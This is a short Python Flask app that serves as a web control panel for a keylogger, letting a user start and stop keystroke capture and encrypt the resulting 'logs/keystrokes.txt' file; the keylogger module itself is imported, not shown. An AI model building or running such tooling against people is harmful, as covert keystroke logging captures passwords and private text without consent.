from flask import Flask, render_template, redirect, url_for, request
from keylogger import start_logger, stop_logger, is_running
from encryption import encrypt_log_file

app = Flask(__name__)

@app.route('/', methods=["GET"])
def index():
    status = "Running" if is_running() else "Stopped"
    return render_template("index.html", status=status)

@app.route('/toggle', methods=["POST"])
def toggle():
    if is_running():
        stop_logger()
        encrypt_log_file("logs/keystrokes.txt")
    else:
        start_logger()
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)
